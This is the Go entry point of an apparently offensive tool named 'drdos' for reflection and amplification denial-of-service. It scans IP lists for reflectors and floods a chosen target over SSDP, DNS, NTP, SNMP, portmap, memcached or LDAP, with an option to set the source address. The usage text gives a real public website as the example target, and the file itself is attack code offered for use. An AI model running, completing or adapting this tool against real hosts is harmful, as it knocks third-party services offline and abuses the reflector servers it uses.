package main

import (
	"flag"
	"fmt"
	"os"

	"drdos/config"
	"drdos/core"
	"drdos/plugins"
	"drdos/utils"
)

func modeWarn() {
	fmt.Println("[!] Mode must be set !")
	fmt.Println("[*] c		check ip mode")
	fmt.Println("[*] a		attack mode")
	fmt.Println("[*] m		mix mode(select And attack)")
}

func usage() {
	fmt.Println(`[*] Check Mode:
	go run main.go -m c -f test.txt -o output.txt --type
[*] Atk	Mode:
	go run main.go -m a -f test.txt -t www.baidu.com -p 80 --type dns
[*] Mix Mode:
	go run main.go -m m -f test.txt -t www.baidu.com -p 80 --type dns -o output.txt`)
}

// 支持域名，然后解析

func main() {
	var (
		mode       string // 模式选择，是IP筛选，还是攻击，还是筛选加攻击
		ipaddress  string // target ip
		srcaddress string // src ip
		port       int    // target port
		atktype    string // 攻击类型
		interval   uint   // 发包间隔
		loadfile   string // IP列表
		outputfile string // 输出的IP列表
		timeout    uint   // 攻击时间超时
	)

	flag.StringVar(&mode, "m", "", "c(check)|a(attack)|m(mix mode)")
	flag.StringVar(&ipaddress, "t", "", "Target ip")
	flag.StringVar(&srcaddress, "s", "", "Source ip (use internal ip if using ECS -- like aliyun)")
	flag.IntVar(&port, "p", 80, "Target port")
	flag.StringVar(&atktype, "type", "", "Attack type (ssdp|dns|ntp|snmp|portmap|mem|ldap)")
	flag.UintVar(&interval, "i", 10000, "Interval(0 for attack, 10000 for check, set it on config if using mix mode)")
	flag.StringVar(&loadfile, "f", "", "Vulnerable iplist path")
	flag.StringVar(&outputfile, "o", "", "Output file path")
	flag.UintVar(&timeout, "timeout", 120, "Attack time")
	flag.Parse()

	// 黑名单校验
	if utils.IsContain(plugins.Blacklist, ipaddress) {
		fmt.Println("[!] IP not allowed")
		return
	}
	dir, _ := os.Getwd()
	// 参数校验
	// 设置mode
	switch mode {
	// 筛选IP模式
	case "c":
		fmt.Println("[+] Check Mode start")
		// 输入文件校验
		if loadfile == "" || outputfile == "" {
			fmt.Println("[-] Input error!")
			usage()
			return
		}

		fmt.Println("[+] Starting Loadfile from /data/loadfile/")
		iplist, err := utils.FileLoads(dir + "/data/loadfile/" + loadfile)
		if err != nil {
			return
		}

		_, err = core.Check(iplist, atktype, outputfile, interval, srcaddress)
		if err != nil {
			fmt.Println("[-] Check FAILED !")
		}

	// Attack模式
	case "a":
		fmt.Println("[+] Attack Mode")
		if ipaddress == "" || atktype == "" || loadfile == "" {
			fmt.Println("[-] Input error!")
			usage()
		}
		if port > 65535 || port <= 0 {
			fmt.Println("[-] Port in range 1~65535")
			return
		}
		// [*] Attack模块内容
		fmt.Println("[+] Starting Loadfile from /data/results/")
		iplist, err := utils.FileLoads(dir + "/data/results/" + loadfile)
		if err != nil {
			return
		}
		if interval == 10000 {
			interval = 0
		}
		err = core.Attack(iplist, ipaddress, atktype, port, interval, timeout)
		if err != nil {
			fmt.Println("[-] Attack Error")
			return
		}
	// Mix模式
	case "m":
		fmt.Println("[+] Mix Mode")
		if ipaddress == "" || atktype == "" || loadfile == "" || outputfile == "" {
			fmt.Println("[!] Please input right value")
			usage()
		}
		if port > 65535 || port <= 0 {
			fmt.Println("[!] Port in range 1~65535")
			return
		}

		fmt.Println("[+] Starting Loadfile from /data/loadfile/")
		iplist, err := utils.FileLoads(dir + "/data/loadfile/" + loadfile)
		if err != nil {
			return
		}

		result, err := core.Check(iplist, atktype, outputfile, interval, srcaddress)
		if err != nil {
			fmt.Println("[-] Check FAILED !")
		}

		atklist := []string{}
		for index := range result {
			atklist = append(atklist, index)
		}

		err = core.Attack(atklist, ipaddress, atktype, port, config.AttackInterval, timeout)
		if err != nil {
			fmt.Println("[-] Attack Error")
			return
		}

	default:
		modeWarn()
	}
}
